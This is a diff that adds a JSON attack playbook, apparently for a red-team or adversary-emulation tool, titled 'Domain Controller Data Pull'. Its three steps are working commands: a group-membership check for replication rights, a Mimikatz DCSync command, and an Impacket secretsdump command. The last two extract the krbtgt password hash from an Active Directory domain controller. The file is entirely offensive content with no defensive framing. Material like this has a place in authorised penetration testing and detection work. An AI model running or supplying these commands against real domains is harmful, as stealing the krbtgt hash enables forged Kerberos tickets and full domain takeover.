@@ -1,0 +1,25 @@
+{
+	"name": "Domain Controller Data Pull",
+	"description": "Abuse replication rights to extract user hashes from DCs.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Replication Rights Check",
+			"command": "whoami /groups | findstr \"Replic\"",
+			"description": "Verify DS-Replication permissions."
+		},
+		{
+			"index": 2,
+			"name": "Hash Extraction",
+			"command": "lsadump::dcsync /domain:corp.local /user:krbtgt /csv",
+			"description": "Pull krbtgt hash."
+		},
+		{
+			"index": 3,
+			"name": "Impacket Alternative",
+			"command": "secretsdump.py corp/user@dc01.corp.local -just-dc-user krbtgt",
+			"description": "Cross-platform DCSync."
+		}
+	]
+}
